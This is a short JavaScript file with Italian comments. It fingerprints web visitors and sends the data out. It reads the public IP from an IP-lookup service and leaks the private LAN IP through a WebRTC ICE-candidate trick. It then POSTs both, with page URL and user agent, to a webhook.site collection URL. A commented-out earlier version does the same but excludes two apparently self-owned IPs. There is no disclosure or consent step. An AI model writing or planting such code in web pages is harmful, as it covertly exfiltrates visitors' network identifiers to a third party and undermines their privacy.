/*fetch("https://api.ipify.org?format=json")
  .then(res => res.json())
  .then(data => {
    const ip = data.ip;
    
    if(ip !== "157.138.166.194" && ip !== "94.247.10.125") {
      fetch("https://webhook.site/183eeec6-640b-4e5d-b9ff-bf1d5165adcc", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          ip: ip,
          page: window.location.href,
          userAgent: navigator.userAgent
        })
      });
    }
  })
  .catch(error => {
    console.error('Error fetching IP or sending data:', error);
  });*/
// Funzione per ottenere l'IP privato tramite WebRTC
function getPrivateIP() {
  return new Promise((resolve, reject) => {
    const pc = new RTCPeerConnection({ iceServers: [] });
    pc.createDataChannel('');
    pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(reject);

    pc.onicecandidate = (ice) => {
      if (!ice || !ice.candidate || !ice.candidate.candidate) return;
      const ipMatch = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate);
      if (ipMatch) {
        resolve(ipMatch[1]); // IP privato trovato
        pc.close();
      }
    };
  });
}

// Ottieni IP pubblico e privato
Promise.all([
  fetch("https://api.ipify.org?format=json").then(res => res.json()).then(data => data.ip),
  getPrivateIP()
]).then(([publicIP, privateIP]) => {
  console.log("IP Pubblico:", publicIP);
  console.log("IP Privato:", privateIP);

  // Invia i dati al webhook
  fetch("https://webhook.site/183eeec6-640b-4e5d-b9ff-bf1d5165adcc", {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      publicIP: publicIP,
      privateIP: privateIP,
      page: window.location.href,
      userAgent: navigator.userAgent
    })
  });
}).catch(error => {
  console.error('Errore nel recupero degli IP o nell\'invio dei dati:', error);
});
